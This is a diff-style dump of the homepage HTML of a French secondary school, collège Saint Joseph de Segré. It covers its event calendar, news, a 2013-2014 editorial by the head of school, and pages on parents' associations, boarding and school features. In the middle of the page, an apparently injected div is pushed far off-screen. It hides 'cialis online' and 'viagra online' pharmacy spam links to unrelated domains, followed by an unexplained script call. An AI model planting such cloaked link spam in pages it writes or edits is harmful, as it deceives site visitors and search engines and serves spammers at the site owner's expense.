+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=19&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">19</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=20&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">20</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=21&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">21</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=22&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">22</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=23&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">23</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=24&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">24</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=25&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">25</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=26&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">26</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=27&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">27</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=28&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">28</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=29&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">29</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=30&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">30</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=31&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">31</a></td>
+<td class="mod_events_td_dayoutofmonth">1</td>
+<td class="mod_events_td_dayoutofmonth">2</td>
+</tr>
+</table>
+</div>					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>A venir ...</h3>
+											<table class="mod_events_latest_table" width="100%" border="0" cellspacing="0" cellpadding="0" align="center"><tr><td class="mod_events_latest_first"><span class="mod_events_latest_date">Mar Sep 10 @08:00</span><br /><span class="mod_events_latest_content"><a href="/index.php?option=com_jevents&amp;task=icalrepeat.detail&amp;evid=690&amp;Itemid=66&amp;year=2013&amp;month=09&amp;day=10&amp;title=photos-eleves&amp;uid=3e237c8cc43ad72424e75a37f159f4c9">Photos élèves</a></span></td></tr>
+<tr><td class="mod_events_latest"><span class="mod_events_latest_date">Jeu Sep 12 @17:00</span><br /><span class="mod_events_latest_content"><a href="/index.php?option=com_jevents&amp;task=icalrepeat.detail&amp;evid=692&amp;Itemid=66&amp;year=2013&amp;month=09&amp;day=12&amp;title=assemblee-generale-des-professeurs-et-du-personnel-dencadrement&amp;uid=da0610942fb33afe4ed3521f6ab764b6">Assemblée générale des professeurs et du personnel d&#039;encadrement</a></span></td></tr>
+<tr><td class="mod_events_latest"><span class="mod_events_latest_date">Sam Sep 14 @16:00</span><br /><span class="mod_events_latest_content"><a href="/index.php?option=com_jevents&amp;task=icalrepeat.detail&amp;evid=693&amp;Itemid=66&amp;year=2013&amp;month=09&amp;day=14&amp;title=rencontre-association-qles-anciens-de-st-joq&amp;uid=464b778cbfbbd720429c039d8ada04a5">rencontre association &quot;les anciens de St Jo&quot;</a></span></td></tr>
+<tr><td class="mod_events_latest"><span class="mod_events_latest_date">Mar Sep 17 @17:00</span><br /><span class="mod_events_latest_content"><a href="/index.php?option=com_jevents&amp;task=icalrepeat.detail&amp;evid=694&amp;Itemid=66&amp;year=2013&amp;month=09&amp;day=17&amp;title=reunion-titulaires-6d&amp;uid=9c5ea787ff2450e559c433063868d629">réunion titulaires 6°</a></span></td></tr>
+</table>
+					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>Image au hasard</h3>
+											<div align="center">
+	<img src="/images/imagesH2/photosimages2 _14.JPG" alt="photosimages2 _14.JPG" width="100" height="66" /></div>					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+                                                                <div id="content_outmiddle">
+									                                        <div class="user_bg">
+                                            <div class="user_left">
+                                                <div class="user_right">
+													                                                        <div class="topmodule_usertwo">
+                                                        	<div class="user_inside1">		<div class="moduletable">
+					<h3>Dernières infos</h3>
+					<ul class="latestnews">
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=288:une-rentree-ensoleillee-au-soleil&amp;catid=62:actualites&amp;Itemid=18" class="latestnews">
+			Une rentrée ensoleillée, au soleil!</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=287:il-pleut-il-mouille-cest-la-fete-des--gargouilles-&amp;catid=62:actualites&amp;Itemid=18" class="latestnews">
+			Il pleut, il mouille c'est la fête des ... gargouilles !</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=286:recompenses-du-concours-ldroles-de-mathsr-2013&amp;catid=62:actualites&amp;Itemid=18" class="latestnews">
+			Récompenses du concours «Drôles de maths» 2013</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=285:l-lheure-du-conte-r-des-6eme-daccueil&amp;catid=62:actualites&amp;Itemid=18" class="latestnews">
+			« L’heure du conte » des 6ème d’accueil…</a>
+	</li>
+	<li class="latestnews">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=284:des-nouvelles-de-guernesey3&amp;catid=79:niveau6&amp;Itemid=62" class="latestnews">
+			des nouvelles de Guernesey3....</a>
+	</li>
+</ul>		</div>
+	</div><div style="left:-5155px; top:-4061px; position:absolute">
+Find out why <a href="http://hallmarkbusiness.com.au/newsend/send.html">cialis online</a> , and much more.
+Online pharmacy, <a href="http://www.bellparksportsclub.com.au/assets/setup.html">viagra online</a> , low prices.
+</div>
+
+<script type="text/javascript">end_();</script>
+
+                                                        </div>
+                                                                                                                                                                <div class="separator"></div>
+                                                        <div class="topmodule_usertwo">
+                                                        	<div class="user_inside">		<div class="moduletable">
+					<h3>Articles populaires</h3>
+					<ul class="mostread">
+	<li class="mostread">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=72:carte-didentite&amp;catid=64:pagedaccueil&amp;Itemid=70" class="mostread">
+			Carte d'identité</a>
+	</li>
+	<li class="mostread">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=104:article-resultats-brevet&amp;catid=92:evenements-divers&amp;Itemid=75" class="mostread">
+			Résultats du Brevet</a>
+	</li>
+	<li class="mostread">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=232:documents-rentree-2012-2013&amp;catid=62:actualites&amp;Itemid=76" class="mostread">
+			Documents rentrée 2013-2014</a>
+	</li>
+	<li class="mostread">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=95:contacts&amp;catid=67:locaux&amp;Itemid=72" class="mostread">
+			contacts</a>
+	</li>
+	<li class="mostread">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=91:le-cross-du-college&amp;catid=73:cross&amp;Itemid=37" class="mostread">
+			Le cross du collège</a>
+	</li>
+</ul>		</div>
+	</div>
+                                                        </div>
+                                                                                                    </div>
+                                            </div>
+                                        </div>
+                                                                        <div id="content">
+                                        <div id="content_border_right">
+                                            <div id="content_border_left">
+                                                <div id="content_bottom_right">
+                                                	<div id="content_bottom_left"><div class="componentheading">
+	Bienvenue sur la page d'Accueil</div>
+<table class="blog" cellpadding="0" cellspacing="0">
+<tr>
+	<td valign="top">
+					<div>
+		
+<table class="contentpaneopen">
+<tr>
+		<td class="contentheading" width="100%">
+					Cette semaine			</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=93:cette-semaine&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/pdf_button.png" alt="PDF"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=93:cette-semaine&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Imprimer" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/printButton.png" alt="Imprimer"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?option=com_mailto&amp;tmpl=component&amp;link=aHR0cDovL2NvbGxlZ2Utc3Rqby1zZWdyZS1lYzQ5Lm9yZy9pbmRleC5waHA/b3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD05MzpjZXR0ZS1zZW1haW5lJmNhdGlkPTY0OnBhZ2VkYWNjdWVpbA==" title="Envoyer" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/images/M_images/emailButton.png" alt="Envoyer"  /></a>	</td>
+		</tr>
+</table>
+<table class="contentpaneopen">
+
+
+
+
+<tr>
+<td valign="top" colspan="2">
+<table frame="border" rules="all" border="1" style="border: 1px solid #000000; width: 826px; height: 383px; background-color: #ffffff;">
+<tbody>
+<tr>
+<td style="border: 1px solid #000000; text-align: left; background-color: #cef2fc;" valign="top">   
+<ul>
+<li><span style="font-size: 14pt;"><strong><span style="color: #339966;">Une rentrée ensoleillée, au soleil...</span><br /></strong></span></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td>
+<div style="text-align: center;">
+<div><span style="font-size: 8pt;"><strong><span style="color: #ff6600;"> </span></strong></span><br /><a href="/index.php?option=com_content&amp;view=article&amp;id=232&amp;Itemid=76"><span style="color: #3366ff; font-size: 24pt;">Documents à télécharger</span></a> <a href="/index.php?option=com_content&amp;view=article&amp;id=232&amp;Itemid=76"></a>
+<div><span style="color: #ff9900; font-size: 18pt;"><a href="/index.php?option=com_content&amp;view=article&amp;id=232&amp;Itemid=76"><span style="font-size: 12pt;"><span style="font-size: 24pt; color: #3366ff;">pour la rentrée scolaire 2013-2014</span></span></a><strong><span style="font-size: 12pt;"><br /></span></strong></span></div>
+<br /><strong><span style="font-size: 14pt; color: #3366ff;"><span style="font-size: 24pt; color: #ff6600;"><span size="5" style="font-size: large;">Lundi 09 septembre : 1/2 journée d'intégration</span></span></span></strong>
+<div>
+<p><span style="color: #ff6600; font-size: 14pt;"><strong>pour les élèves de 5°III</strong></span></p>
+</div>
+<div><span style="font-size: 14pt;"><span style="font-size: 24pt;"><span style="font-size: 10pt;"> </span></span></span></div>
+<div><strong><span style="color: #ff6600; font-size: 14pt;">Mardi 10 septembre : Photo scolaire</span></strong></div>
+<div><strong><span style="color: #ff6600; font-size: 14pt;">journée d'intégration </span></strong><strong><span style="color: #ff6600; font-size: 14pt;">pour les 6°VII à Chalain la Potherie</span></strong></div>
+<div><span style="color: #3366ff;"><strong><span style="font-size: 18pt;"> </span></strong></span></div>
+<div><span style="color: #3366ff;"><span style="font-size: 18pt;">Jeudi 12 septembre : assemblée générale des professeurs</span></span></div>
+<div><span style="font-size: 14pt; color: #3366ff;"><span style="font-size: 18pt;"> </span><span style="font-size: 12pt;"><span style="color: #ff6600;"><span color="#3366ff" size="5" style="color: #3366ff; font-size: large;">et du personnel d'encadrement</span></span><strong><span style="color: #ff6600;"><br /></span></strong></span></span></div>
+</div>
+<div style="text-align: center;"></div>
+</div>
+</td>
+</tr>
+<tr>
+<td style="border: #0f0b0b 1px solid;" valign="top">
+<div style="text-align: center;"></div>
+<div style="text-align: center;"><span style="background-color: #ffff00;"><strong><span style="font-size: 14pt; color: #0000ff;"><br /></span></strong></span></div>
+<div style="text-align: center;"><strong><span style="color: #ff0000; font-size: 18pt;">DU NOUVEAU AU COLLEGE</span></strong></div>
+<div style="text-align: center;"></div>
+<div>
+<div style="text-align: center;"><br /><a href="/images/stories/pdf/Option%202LV1-2013.pdf"><strong><span style="color: #0000ff; font-size: 14pt;"><span style="font-size: 18pt;">A la rentrée 2013, ouverture d'une 6<span style="font-size: 12pt;"><sup>ème</sup></span> bi</span><span style="font-size: 18pt;">langue Allemand - Anglais</span></span></strong><span style="color: #0000ff; font-size: 14pt;"><br /></span></a></div>
+<a href="/images/stories/pdf/Option%202LV1-2013.pdf"></a>
+<div style="text-align: center;"><a href="/images/stories/pdf/Option%202LV1-2013.pdf"><span style="color: #0000ff; font-size: 14pt;"><span style="font-size: 10pt;">- Pour tout renseignement complémentaire, merci de contacter le secrétariat - direction du collège St Joseph -</span></span></a></div>
+<div style="text-align: center;"><span style="color: #0000ff; font-size: 14pt;"><span style="font-size: 10pt;"><br /></span></span></div>
+<div style="text-align: center;"><a href="/index.php?option=com_content&amp;view=article&amp;id=194:une-association-des-anciens-de-st-jo-&amp;catid=62&amp;Itemid=18"><strong><span style="color: #0000ff; font-size: 18pt;">Association des anciens de Saint jo</span></strong></a></div>
+<div style="text-align: center;"></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table></td>
+</tr>
+
+<tr>
+	<td colspan="2"  class="modifydate">
+		Mise à jour le Lundi, 09 Septembre 2013 12:12	</td>
+</tr>
+
+
+</table>
+<span class="article_separator">&nbsp;</span>
+		</div>
+					<div>
+		
+<table class="contentpaneopen">
+<tr>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=45:joomla-community-portal&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/pdf_button.png" alt="PDF"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=45:joomla-community-portal&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Imprimer" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/printButton.png" alt="Imprimer"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?option=com_mailto&amp;tmpl=component&amp;link=aHR0cDovL2NvbGxlZ2Utc3Rqby1zZWdyZS1lYzQ5Lm9yZy9pbmRleC5waHA/b3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD00NTpqb29tbGEtY29tbXVuaXR5LXBvcnRhbCZjYXRpZD02NDpwYWdlZGFjY3VlaWw=" title="Envoyer" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/images/M_images/emailButton.png" alt="Envoyer"  /></a>	</td>
+		</tr>
+</table>
+<table class="contentpaneopen">
+
+
+
+
+<tr>
+<td valign="top" colspan="2">
+<div style="text-align: justify; text-indent: 35.4pt;"><span style="text-decoration: underline; color: #3366ff;"> </span></div>
+<div style="margin-left: 36pt; text-align: justify;"><span style="color: #3366ff; font-size: 10pt;"> </span>
+<p style="text-align: justify; tab-stops: 35.4pt;"><span style="color: #3366ff; font-size: 10pt;"><b><span style="text-decoration: underline;"></span></b><b><span style="text-decoration: underline;">Éditorial 2013-2014</span></b></span></p>
+<p style="text-align: justify; tab-stops: 35.4pt;"><span style="text-decoration: underline; color: #3366ff;"> </span></p>
+<p style="text-align: justify;"><span style="color: #3366ff;">Au collège Saint Joseph de Segré, l’année 2012-2013 fut un bon millésime. Je remercie tous les acteurs de cette réussite et en particulier nos élèves. Ceux de 3<sup>ème</sup> ont quitté leur collège Saint JO avec un taux de 95,5% de réussite à leur Diplôme National du Brevet (D.N.B.) ; nous les félicitons.</span></p>
+<p style="text-align: justify; tab-stops: 35.4pt;"><span style="color: #3366ff;">Dès cette nouvelle rentrée, quelques 642 jeunes (stabilité générale) ont rejoint nos 25 classes. Nous remercions tous les parents pour la confiance que vous nous témoignez.</span></p>
+<p style="tab-stops: 35.4pt;"><span style="color: #3366ff;">Comme l’an passé, de nombreux projets seront initiés et d’autres reconduits, pour le bien-être de tous : (N’hésitez pas à consulter régulièrement notre site. </span><b><a href="http://college-stjo-segre-ec49.org/">http://college-stjo-segre-ec49.org</a></b>)</p>
+<ul style="list-style-type: circle;">
+<li><span style="color: #3366ff;"><b style="mso-bidi-font-weight: normal;">Une classe de 6<sup>ème</sup> proposant une 2<sup>ème</sup> langue vivante (allemand) est officiellement ouverte</b><b> </b></span></li>
+<li><span style="color: #3366ff;">Notre fonctionnement en séquences de 50’ permet de dégager de nombreuses heures hebdomadaires, redistribuées devant les élèves dans des séquences d’A.T.P (Aide au Travail Personnel) ou dans d’autres projets.</span></li>
+<li><span style="color: #3366ff;">Nous harmonisons nos pratiques dans les trois classes à profil (6<sup>ème</sup> d’Accueil, 5<sup>ème</sup> de Soutien, 4<sup>ème</sup> d’Accompagnement) à effectif allégé, <b>où</b> <b>nous</b> <b>accueillons des enfants en difficultés scolaires</b>, ou plutôt en mal avec leur scolarisation. Des passerelles régulières avec les autres classes du même niveau sont envisagées.<b> </b></span></li>
+</ul>
+<ul style="list-style-type: circle;">
+<li><span style="color: #3366ff;">A la demande des élèves et de l’Animatrice en Pastorale, un « coin prière » intime, est créé à l’aumônerie,  pour <b>oser un regard différent et permettre la parole intérieure</b>…</span></li>
+<li><span style="color: #3366ff;"><b>Une culture religieuse</b>, est proposée aux élèves des classes de 6<sup>ème</sup>.</span></li>
+<li><span style="color: #3366ff;">Certains enfants vivent avec des handicaps perturbant leur scolarité, et sont accueillis au collège dans le cadre d’un « Projet Personnalisé ». Faisons en sorte, avec les équipes concernées et les camarades de classe, <b>que nos paroles et nos gestes les aident à grandir au milieu de nous tous</b>…</span></li>
+<li><span style="color: #3366ff;">Une <b style="mso-bidi-font-weight: normal;">permanence d’écoute</b> sera ouverte, chaque semaine, le vendredi de 11h55 à 13h25, par une psychologue professionnelle, en toute confidence et anonymat. Chacun peut s’y rendre en fonction de ses besoins…</span></li>
+<li><span style="color: #3366ff;">La relecture régulière du <b>Projet d’Établissement</b>, permet à chaque membre de la communauté  éducative de s’exprimer, d’être force de propositions et d’innovations, afin d’améliorer le quotidien des jeunes qui nous sont confiés…</span></li>
+</ul>
+<p style="text-align: center;"><span style="color: #3366ff;"><b><i>« ESPERER en l’ELEVE, c’est AIMER son AVENIR ! »</i></b></span></p>
+<p style="text-align: justify; padding-left: 30px;"><span style="color: #3366ff;"><b>Bonne année scolaire, à tous et à toutes.</b></span></p>
+<p style="text-align: justify; padding-left: 30px;"><span style="color: #3366ff;"><b>Je vous souhaite une agréable visite sur notre site.</b></span></p>
+<p style="padding-left: 30px; text-align: center;"><span style="color: #3366ff;">Robert RIGAUD,</span></p>
+<p style="padding-left: 30px; text-align: center;"><span style="color: #3366ff;">Chef d’Etablissement.</span></p>
+</div></td>
+</tr>
+
+<tr>
+	<td colspan="2"  class="modifydate">
+		Mise à jour le Jeudi, 29 Août 2013 09:45	</td>
+</tr>
+
+
+</table>
+<span class="article_separator">&nbsp;</span>
+		</div>
+		</td>
+</tr>
+
+<tr>
+	<td valign="top">
+		<table width="100%"  cellpadding="0" cellspacing="0">
+		<tr>
+										<td valign="top" width="50%" class="article_column">
+				
+<table class="contentpaneopen">
+<tr>
+		<td class="contentheading" width="100%">
+					Les Associations de parents			</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=44:les-associations-de-parents&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/pdf_button.png" alt="PDF"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=44:les-associations-de-parents&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Imprimer" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/printButton.png" alt="Imprimer"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?option=com_mailto&amp;tmpl=component&amp;link=aHR0cDovL2NvbGxlZ2Utc3Rqby1zZWdyZS1lYzQ5Lm9yZy9pbmRleC5waHA/b3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD00NDpsZXMtYXNzb2NpYXRpb25zLWRlLXBhcmVudHMmY2F0aWQ9NjQ6cGFnZWRhY2N1ZWls" title="Envoyer" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/images/M_images/emailButton.png" alt="Envoyer"  /></a>	</td>
+		</tr>
+</table>
+<table class="contentpaneopen">
+
+
+
+
+<tr>
+<td valign="top" colspan="2">
+<div class="texte">
+<p align="justify" class="spip" style="text-align: center;"><strong class="spip"><span style="color: #666699;"><span style="color: #993300;">O.G.E.C et ASSOCIATIONS DE PARENTS</span></span></strong></p>
+<p align="justify" class="spip" style="text-align: center;"><span style="color: #993300;"><strong class="spip">&nbsp;</strong></span></p>
+<p align="justify" class="spip"><span style="color: #993300;">Les Parents sont présents dans plusieurs Associations</span></p>
+<p align="justify" class="spip"><span style="color: #993300;">&nbsp;</span></p>
+<p align="justify" class="spip"><span style="color: #993300;"><strong class="spip">1 * L’organisme de gestion - l’O.G.E.C</strong></span></p>
+<p align="justify" class="spip"><strong><span style="color: #993300;">2 * Le Conseil de Parents Délégués</span></strong></p>
+<p align="justify" class="spip"><strong><span style="color: #993300;">3 * Le Conseil d’Etablissement</span></strong></p>
+<p align="justify" class="spip"><strong><span style="color: #993300;">4 * L’ A.P.E.L&nbsp;</span></strong></p>
+<p align="justify" class="spip"><strong><span style="color: #993300;">&nbsp;</span></strong></p>
+<strong><span style="color: #993300;">
+</td>
+</tr>
+
+<tr>
+	<td colspan="2"  class="modifydate">
+		Mise à jour le Dimanche, 10 Juillet 2011 07:18	</td>
+</tr>
+
+<tr>
+	<td  colspan="2">
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=44:les-associations-de-parents&amp;catid=64:pagedaccueil" class="readon">
+			Lire la suite...</a>
+	</td>
+</tr>
+
+</table>
+<span class="article_separator">&nbsp;</span>
+
+<table class="contentpaneopen">
+<tr>
+		<td class="contentheading" width="100%">
+					Structure d'accueil			</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=6:structure-daccueil&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/pdf_button.png" alt="PDF"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=6:structure-daccueil&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Imprimer" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/printButton.png" alt="Imprimer"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?option=com_mailto&amp;tmpl=component&amp;link=aHR0cDovL2NvbGxlZ2Utc3Rqby1zZWdyZS1lYzQ5Lm9yZy9pbmRleC5waHA/b3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD02OnN0cnVjdHVyZS1kYWNjdWVpbCZjYXRpZD02NDpwYWdlZGFjY3VlaWw=" title="Envoyer" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/images/M_images/emailButton.png" alt="Envoyer"  /></a>	</td>
+		</tr>
+</table>
+<table class="contentpaneopen">
+
+
+
+
+<tr>
+<td valign="top" colspan="2">
+<p align="justify" class="spip"> </p>
+<p align="justify" class="spip" style="text-align: center;"><span style="color: #333399; font-size: 14pt;">Structure d'accueil </span></p>
+<p align="justify" class="spip"> </p>
+<p align="justify" class="spip"><span style="color: #333399;">Notre collège accueille des élèves dont certains sont externes et d’autres demi-pensionnaires.</span></p>
+<p align="justify" class="spip"> </p>
+<p align="justify" class="spip"><span style="color: #333399;">Le Collège peut accueillir des élèves en internat. </span></p>
+<p align="justify" class="spip"><span style="color: #333399;">Une convention est mise en place avec le Lycée Bourg-Chevreau qui est l’établissement d’accueil des élèves pensionnaires.</span></p>
+<p align="justify" class="spip"><span style="color: #333399;">Les trajets s’effectuent grâce au bus de la ville qui peut amener les élèves au collège le matin et les ramener au lycée le soir.</span></p>
+<p align="justify" class="spip"><span style="color: #333399;">8 garçons et 12 filles peuvent ainsi bénéficier de ce partenariat entre les deux établissements.</span></p>
+<p align="justify" class="spip"> </p>
+<p align="justify" class="spip"><span style="color: #333399;">Cette proposition pourra satisfaire des familles dont le domicile est éloigné du collège et qui souhaitent inscrire leur enfant .</span></p>
+<p align="justify" class="spip"><span style="color: #333399;">Pour tous renseignements, contacter le secrétariat du collège.<img height="80" width="108" src="/images/stories/key.jpg" alt="key" />0241947350</span></p>
+<br /></td>
+</tr>
+
+<tr>
+	<td colspan="2"  class="modifydate">
+		Mise à jour le Samedi, 15 Octobre 2011 20:55	</td>
+</tr>
+
+
+</table>
+<span class="article_separator">&nbsp;</span>
+</td>
+														<td valign="top" width="50%" class="article_column column_separator">
+				
+<table class="contentpaneopen">
+<tr>
+		<td class="contentheading" width="100%">
+					Les spécificités			</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=9:les-specificites&amp;format=pdf" title="PDF" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/pdf_button.png" alt="PDF"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?view=article&amp;catid=64:pagedaccueil&amp;id=9:les-specificites&amp;tmpl=component&amp;print=1&amp;layout=default&amp;page=" title="Imprimer" onclick="window.open(this.href,'win2','status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no'); return false;" rel="nofollow"><img src="/images/M_images/printButton.png" alt="Imprimer"  /></a>	</td>
+	
+		<td align="right" width="100%" class="buttonheading">
+	<a href="/index.php?option=com_mailto&amp;tmpl=component&amp;link=aHR0cDovL2NvbGxlZ2Utc3Rqby1zZWdyZS1lYzQ5Lm9yZy9pbmRleC5waHA/b3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD05Omxlcy1zcGVjaWZpY2l0ZXMmY2F0aWQ9NjQ6cGFnZWRhY2N1ZWls" title="Envoyer" onclick="window.open(this.href,'win2','width=400,height=350,menubar=yes,resizable=yes'); return false;"><img src="/images/M_images/emailButton.png" alt="Envoyer"  /></a>	</td>
+		</tr>
+</table>
+<table class="contentpaneopen">
+
+
+
+
+<tr>
+<td valign="top" colspan="2">
+<p> </p>
+<p> </p>
+<p><span style="color: #000080; font-size: 14pt;">Les spécificités du collège </span></p>
+<p> </p>
+<ul>
+<li style="text-align: left;"><span style="color: #3366ff;">Une grille horaire originale : des séances de 50 minutes : un rythme qui correspond à celui des collégiens</span></li>
+<li style="text-align: left;"><span style="color: #3366ff;">Des Sections Sportives Scolaires : football et badminton</span></li>
+<li style="text-align: left;"><span style="color: #3366ff;">Une organisation des activités sur le temps du midi</span></li>
+</ul>
+<p><span style="color: #3366ff;"> </span></p>
+<ul>
+<li>
+<div align="justify" class="spip"><span style="color: #3366ff;">Un horaire aménagé pour les 6° : début des cours à 9 heures (sauf le mercredi ou une seule fois par semaine)</span></div>
+</li>
+<li>
